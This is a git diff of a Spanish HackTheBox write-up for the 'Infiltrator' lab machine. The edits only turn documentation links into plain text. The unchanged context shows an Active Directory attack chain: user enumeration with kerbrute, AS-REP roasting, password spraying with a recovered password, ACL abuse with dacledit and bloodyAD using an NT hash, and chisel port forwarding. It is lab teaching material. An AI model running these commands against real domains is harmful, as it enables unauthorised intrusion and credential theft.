@@ -15,7 +15,7 @@ Al esta maquina no disponer de credenciales (como en un entorno empresarial real
 
 ### Nmap Scan
 
-Comenzaremos con el tipico [nmap](Redes/nmap.md) para reconocer los puertos abiertos y que servicios estos corren para hacernos una idea de por donde seria nuestro vector de ataque:
+Comenzaremos con el tipico nmap para reconocer los puertos abiertos y que servicios estos corren para hacernos una idea de por donde seria nuestro vector de ataque:
 
 ```bash
 ❯ nmap -A -sV --min-rate 5000 -T5 -p- 10.10.11.31 -vvv --open -oN scan.txt
@@ -375,7 +375,7 @@ Lauren Clark
 Ethan Rodriguez
 ```
 
-Dejandonos a los usuarios de manera limpia y solo teniendolo que copiar a un archivo de texto, para posteriormente con [username-anarchy](Active%20Directory/Attacking%20AD/username-anarchy.md) hacer la wordlists de usuarios.
+Dejandonos a los usuarios de manera limpia y solo teniendolo que copiar a un archivo de texto, para posteriormente con username-anarchy hacer la wordlists de usuarios.
 
 Una vez teniendo este paso completado, podemos ahora si ejecutar el "username-anarchy" para construir la wordlists a partir de los usuasios que sacamos con curl:
 
@@ -491,7 +491,7 @@ er
 
 ### Access as L.clark
 
-Con la wordlist construida, podemos ahora utilizar la herramienta [kerbrute](Active%20Directory/Attacking%20AD/kerbrute.md) para realizar el ataque de fuerza bruta, y verificar si existe algún usuario valido a nivel de sistema:
+Con la wordlist construida, podemos ahora utilizar la herramienta kerbrute para realizar el ataque de fuerza bruta, y verificar si existe algún usuario valido a nivel de sistema:
 
 ```bash
 ❯ ./kerbrute userenum -d infiltrator.htb --dc "dc01.infiltrator.htb" ../../usernames.txt
@@ -519,9 +519,9 @@ $krb5asrep$18$l.clark@INFILTRATOR.HTB:6139bde5d65e2e822f1cb2ddb35e0cbf$9bc2e269e
 2025/05/12 22:52:39 >  Done! Tested 105 usernames (7 valid) in 1.749 seconds
 ```
 
-Tenemos que existe una cuenta que es de tipo [asreproast](Active%20Directory/Attacking%20AD/asreproast.md), como sabemos esto? Debido a que ASREPRoast es una técnica que aprovecha cuentas de Active Directory que no requieren “pre-autenticación Kerberos”. Esto permite solicitar un ticket cifrado con la contraseña del usuario, sin interactuar la contraseña de forma directa. Al KDC (Key Distribution Center) devolver el ticket con la pass del usuario cifrada, esto le da oportunidad a un atacante de intentar crackear la pass de manera offline, a través de herramientas como John, o Hashcat. En este caso utilizaremos [hashcat](Password%20Cracking/hashcat.md), debido a que este es rapido y trabaja mediante gpu para acelerar el proceso. Pero si no dispones de esto, no te preocupes, John lo puede hacer de igual forma, ya que este trabaja mediante cpu y no gpu.
+Tenemos que existe una cuenta que es de tipo asreproast, como sabemos esto? Debido a que ASREPRoast es una técnica que aprovecha cuentas de Active Directory que no requieren “pre-autenticación Kerberos”. Esto permite solicitar un ticket cifrado con la contraseña del usuario, sin interactuar la contraseña de forma directa. Al KDC (Key Distribution Center) devolver el ticket con la pass del usuario cifrada, esto le da oportunidad a un atacante de intentar crackear la pass de manera offline, a través de herramientas como John, o Hashcat. En este caso utilizaremos hashcat, debido a que este es rapido y trabaja mediante gpu para acelerar el proceso. Pero si no dispones de esto, no te preocupes, John lo puede hacer de igual forma, ya que este trabaja mediante cpu y no gpu.
 
-En mi caso, este primer hash no dio nada (nunca entendi la razon) pero tenemos otra herramienta llamada [GetNPUsers.py](Active%20Directory/Tools/Impacket/GetNPUsers.py.md), la cual se encarga de basicamente lo mismo. Al final nos sirvio de algo kerbrute ya que ahora poseemos los usuarios que son realmente legitimos dentro de la maquina, asi que ahora solo pasamos la lista de usuarios reales,y corremos la tool, por lo que esto nos da en consecuencia lo siguiente:
+En mi caso, este primer hash no dio nada (nunca entendi la razon) pero tenemos otra herramienta llamada `GetNPUsers.py`, la cual se encarga de basicamente lo mismo. Al final nos sirvio de algo kerbrute ya que ahora poseemos los usuarios que son realmente legitimos dentro de la maquina, asi que ahora solo pasamos la lista de usuarios reales,y corremos la tool, por lo que esto nos da en consecuencia lo siguiente:
 
 
 ```bash
@@ -622,7 +622,7 @@ Tenemos la siguiente pass:
 
 `WAT?watismypass!`
 
-Ahora con [netexec](Active%20Directory/Tools/netexec.md) podemos verificar si efectivamente tenemos acceso:
+Ahora con `netexec` podemos verificar si efectivamente tenemos acceso:
 
 ```bash
 ❯ netexec smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!'
@@ -632,7 +632,7 @@ SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:
 
 ### Access as D.anderson
 
-Tenemos acceso dentro de la maquina. Otra cosa que también podríamos hacer seria [Password-Spraying](Active%20Directory/Attacking%20AD/Password-Spraying.md), que consiste en probar la pass que obtuvimos contra otros usuarios para verificar si esta es valida para otros usuarios, o no. Podemos utilizar de igual forma netexec, simplemente pasando el wordlists con los usuarios validos, y la pass que previamente obtuvimos:
+Tenemos acceso dentro de la maquina. Otra cosa que también podríamos hacer seria `Password-Spraying`, que consiste en probar la pass que obtuvimos contra otros usuarios para verificar si esta es valida para otros usuarios, o no. Podemos utilizar de igual forma netexec, simplemente pasando el wordlists con los usuarios validos, y la pass que previamente obtuvimos:
 
 ```bash
 ❯ netexec smb 10.10.11.31 -u users.txt -p 'WAT?watismypass!'
@@ -658,7 +658,7 @@ Nos da positivo que un usuario posee la misma pass que l.clark es valida para d.
 
 ### BloodHound Analysis for Privilege Escalation Paths
 
-Ahora que tenemos esto en cuenta, podríamos tirar de [BloodHound](Active%20Directory/Tools/BloodHound.md) para hacer un vistazo gráficamente a los permisos, rutas, y paths potenciales que nos podrían servir para seguir escalando nuestros privilegios dentro del DC.
+Ahora que tenemos esto en cuenta, podríamos tirar de `BloodHound` para hacer un vistazo gráficamente a los permisos, rutas, y paths potenciales que nos podrían servir para seguir escalando nuestros privilegios dentro del DC.
 
 Después de recolectar los datos necesarios, nos debería de dar lo siguiente a continuación:
 
@@ -690,7 +690,7 @@ Despues de la recoleccion de datos con bloodhound encontramos lo siguiente a con
 
 Utilizamos lo que seria el "PathFinding" que viene incluido en el mismo Bloodhound CE (Community Edition) para ver hasta que usuarios podemos llegar, y nos da que podemos llegar hasta "M.Harris", por lo que, ahora tenemos una idea clara de por donde debemos atacar, y el como podemos hacerlo.
 
-Lo primero que tenemos es un "OU (Organizational Unit)" con un ACL (Access Controll List) de tipo GenericAll. Por lo que, ahora con [dacledit.py](Active%20Directory/Tools/Impacket/dacledit.py.md) podemos heredar los permisos y objetos que poseemos de la OU para poder operar sobre ella.
+Lo primero que tenemos es un "OU (Organizational Unit)" con un ACL (Access Controll List) de tipo GenericAll. Por lo que, ahora con `dacledit.py` podemos heredar los permisos y objetos que poseemos de la OU para poder operar sobre ella.
 
 Con dacledit conseguimos lo siguiente:
 
@@ -735,7 +735,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 ### Shell as M.harris
 
-Ahora que tenemos su hashnt, podemos proceder a agregarla al grupo correspondiente, que seria *"Chiefs Marketing"* a traves de [BloodyAD](Active%20Directory/Tools/BloodyAD.md):
+Ahora que tenemos su hashnt, podemos proceder a agregarla al grupo correspondiente, que seria *"Chiefs Marketing"* a traves de `BloodyAD`:
 
 ```bash
 ❯ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb --dc-ip 10.10.11.31 -u e.rodriguez -p :b02e97f2fdb5c3d36f77375383449e56 add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" "e.rodriguez"
@@ -943,7 +943,7 @@ GET-DESC... 10.10.11.31     389    DC01             User: K.turner description: 
 GET-DESC... 10.10.11.31     389    DC01             User: infiltrator_svc$ description: dc01.infiltrator.htb
 ```
 
-Encontramos lo que vendria siendo un usuario con una posible pass que podria bien pertenecer a la aplicacion de Output Messenger. Dicho esto, procedemos a hacer Port Fowarding a traves de [chisel](Redes/chisel.md). Primero autenticandonos al DC como el usuario que previamente habiamos pwneado que tenia acceso a winrm (Por eso la mencion anterior que si desde un principio veiamos la descripcion de los demas usuarios a traves de LDAP, no nos seriviria de mucho porque necesitabamos tener acceso al DC en un principio).
+Encontramos lo que vendria siendo un usuario con una posible pass que podria bien pertenecer a la aplicacion de Output Messenger. Dicho esto, procedemos a hacer Port Fowarding a traves de `chisel`. Primero autenticandonos al DC como el usuario que previamente habiamos pwneado que tenia acceso a winrm (Por eso la mencion anterior que si desde un principio veiamos la descripcion de los demas usuarios a traves de LDAP, no nos seriviria de mucho porque necesitabamos tener acceso al DC en un principio).
 
 Una vez dentro del DC con una consola interactiva, seria cuestion de crearse un directorio llamado "tools" para incluir alli todas las herramientas a utilizar, digase chisel, algun reverse shell, etc...
 
